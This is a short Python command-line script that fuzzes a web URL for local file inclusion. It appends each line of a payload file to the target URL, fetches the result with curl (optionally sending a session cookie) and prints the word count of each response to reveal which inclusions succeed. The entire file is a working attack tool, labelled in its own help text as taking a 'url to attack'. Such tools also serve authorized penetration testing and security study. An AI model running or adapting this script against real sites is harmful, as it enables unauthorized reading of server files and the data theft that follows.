#!/usr/bin/python3

import sys
import argparse
import subprocess

class Payload:
	params = {"url":None,
	"value":None,
	"cookie":None,
	"file":None
	}
	
	def __str__(self):
		s = ""
		print(self.params)
		for key in self.params:
			if self.params[key] != None:
				s += (key + ": " + self.params[key] + "\n")
			else:
				s += (key + ": None\n")
		
		return s


def create_payload(args):
	payload = Payload()
	payload.params["url"] = args.url
	payload.params["cookie"] = args.c
	
	try:
		payload.params["file"] = open(args.payload_file, "r")
	except FileNotFoundError as msg:
		print(msg)
		sys.exit(1)
	
	return payload


def attack(payload):
	cmd = ["curl", "-s"]
	
	if payload.params["cookie"]:
		cmd.append("--cookie")
		cmd.append(payload.params["cookie"])
	
	for item in payload.params["file"].readlines():
		item = item.rstrip()
		cmd.append(payload.params["url"]+item)
		p1 = subprocess.run(cmd, stdout=subprocess.PIPE)
		p2 = subprocess.run(["wc", "-w"], input=p1.stdout, stdout=subprocess.PIPE)
		output = p2.stdout.decode().rstrip()
		print(" * " + item + ": " + output)
		cmd.pop()


if __name__ == "__main__":
	
	parser = argparse.ArgumentParser(prog=sys.argv[0])
	parser.add_argument("-c", metavar="cookie", help='set header Cookie')
	parser.add_argument("url", help="url to attack")
	parser.add_argument("payload_file", help="file that contains different values of the parameter LFI")
	
	args = parser.parse_args()
	payload = create_payload(args)
	attack(payload)
	
	payload.params["file"].close()
	
